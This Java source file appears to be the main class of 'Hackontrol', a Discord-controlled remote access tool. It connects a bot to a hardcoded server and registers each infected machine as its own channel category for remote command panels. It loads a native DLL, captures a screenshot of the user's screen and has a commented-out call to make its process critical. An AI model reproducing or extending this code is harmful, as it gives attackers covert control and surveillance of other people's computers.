package com.khopan.hackontrol;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.util.List;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.khopan.hackontrol.manager.Manager;
import com.khopan.hackontrol.module.Module;
import com.khopan.hackontrol.nativelibrary.Information;
import com.khopan.hackontrol.nativelibrary.User;
import com.khopan.hackontrol.panel.Panel;
import com.khopan.hackontrol.panel.PanelManager;
import com.khopan.hackontrol.registration.PanelRegistry;
import com.khopan.hackontrol.registration.ServiceRegistry;
import com.khopan.hackontrol.registry.RegistryType;
import com.khopan.hackontrol.security.SecurityManager;
import com.khopan.hackontrol.service.Service;
import com.khopan.hackontrol.service.ServiceManager;
import com.khopan.hackontrol.utils.ErrorHandler;
import com.khopan.hackontrol.utils.HackontrolError;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY = RegistryType.create();
	public static final RegistryType<Void, Class<? extends Module>> MODULE_REGISTRY = RegistryType.create();

	public static final Logger LOGGER = LoggerFactory.getLogger("Hackontrol");
	public static final long STARTUP_TIME = System.currentTimeMillis();

	private static Hackontrol INSTANCE;

	private final JDA bot;
	private final Guild guild;
	private final String machineIdentifier;
	private final Category category;

	private ErrorHandler handler;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		Thread.setDefaultUncaughtExceptionHandler((thread, Errors) -> {
			if(this.handler == null) {
				Errors.printStackTrace();
				return;
			}

			Hackontrol.LOGGER.warn("Uncaught Exception: {}", Errors.toString());
			this.handler.errorOccured(thread, Errors);
		});

		ServiceManager serviceManager = new ServiceManager();
		ServiceRegistry.register(serviceManager);

		for(Service service : serviceManager.serviceList()) {
			Hackontrol.LOGGER.info("Registered service: {}", service.getClass().getName());
		}

		JDABuilder builder = JDABuilder.createDefault(Information.getToken()).enableIntents(GatewayIntent.MESSAGE_CONTENT);
		PanelManager panelManager = new PanelManager();
		serviceManager.applyBuilder(builder, panelManager);
		this.bot = builder.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			throw new RuntimeException();
		}

		Hackontrol.LOGGER.info("Bot is ready");
		serviceManager.initialize(this.bot);
		this.guild = this.bot.getGuildById(1173967259304198154L);
		this.machineIdentifier = Information.getMachineName();
		String categoryName = this.machineIdentifier.toLowerCase();
		Category category = null;

		for(Category entry : this.guild.getCategories()) {
			if(entry.getName().toLowerCase().contains(categoryName)) {
				category = entry;
				break;
			}
		}

		if(category == null) {
			category = this.guild.createCategory(categoryName).complete();
		}

		this.category = category;
		SecurityManager.configureViewPermission(this.category.getManager());
		PanelRegistry.register(panelManager);

		for(Panel panel : panelManager.panelList()) {
			Hackontrol.LOGGER.info("Registered panel: {} ({})", panel.panelName(), panel.getClass().getName());
		}

		panelManager.initialize(this.category);
		//Kernel.setProcessCritical(true);
	}

	public List<Manager> getManagerList() {
		return null;//Collections.unmodifiableList(this.managerList);
	}

	public <T extends Manager> T getManager(Class<T> managerClass) {
		if(managerClass == null) {
			throw new NullPointerException("Manager class cannot be null");
		}

		/*for(Manager manager : this.managerList) {
			if(managerClass.isAssignableFrom(manager.getClass())) {
				return (T) manager;
			}
		}*/

		return null;
	}

	public List<Module> getModuleList() {
		return null;//Collections.unmodifiableList(this.moduleList);
	}

	public <T extends Module> T getModule(Class<T> moduleClass) {
		if(moduleClass == null) {
			throw new NullPointerException("Module class cannot be null");
		}

		/*for(Module module : this.moduleList) {
			if(moduleClass.isAssignableFrom(module.getClass())) {
				return (T) module;
			}
		}*/

		return null;
	}

	public Module getModule(TextChannel textChannel) {
		if(textChannel == null) {
			throw new NullPointerException("Text channel cannot be null");
		}

		/*for(Module module : this.moduleList) {
			if(textChannel.equals(module.channel)) {
				return module;
			}
		}*/

		return null;
	}

	public JDA getBot() {
		return this.bot;
	}

	public Guild getGuild() {
		return this.guild;
	}

	public String getMachineIdentifier() {
		return this.machineIdentifier;
	}

	public Category getCategory() {
		return this.category;
	}

	public ErrorHandler getErrorHandler() {
		return this.handler;
	}

	public void setErrorHandler(ErrorHandler handler) {
		this.handler = handler;
	}

	public static void main(String[] args) throws Throwable {
		if(args.length < 1) {
			Hackontrol.error("Invalid program argument");
			return;
		}

		File pathFolderHackontrol = new File(args[0]);

		if(!pathFolderHackontrol.exists()) {
			Hackontrol.error("Directory '" + pathFolderHackontrol.getAbsolutePath() + "' does not exist");
			return;
		}

		File pathFileLibnative32 = new File(pathFolderHackontrol, "libnative32.dll");

		if(!pathFileLibnative32.exists()) {
			Hackontrol.error("File '" + pathFileLibnative32.getAbsolutePath() + "' does not exist");
			return;
		}

		try {
			System.load(pathFileLibnative32.getAbsolutePath());
		} catch(Throwable Errors) {
			Hackontrol.error(HackontrolError.getMessage(Errors));
			return;
		}

		Hackontrol.LOGGER.info("Initializing");
		//Hackontrol.getInstance();
		ByteArrayInputStream stream = new ByteArrayInputStream(User.screenshot());
		BufferedImage image = ImageIO.read(stream);
		ImageIO.write(image, "png", new File("C:\\Users\\puthi\\Downloads\\screenshot.png"));
	}

	private static void error(String message) throws Throwable {
		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		JOptionPane.showMessageDialog(null, message, "Error", JOptionPane.ERROR_MESSAGE);
		System.exit(1);
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}
}
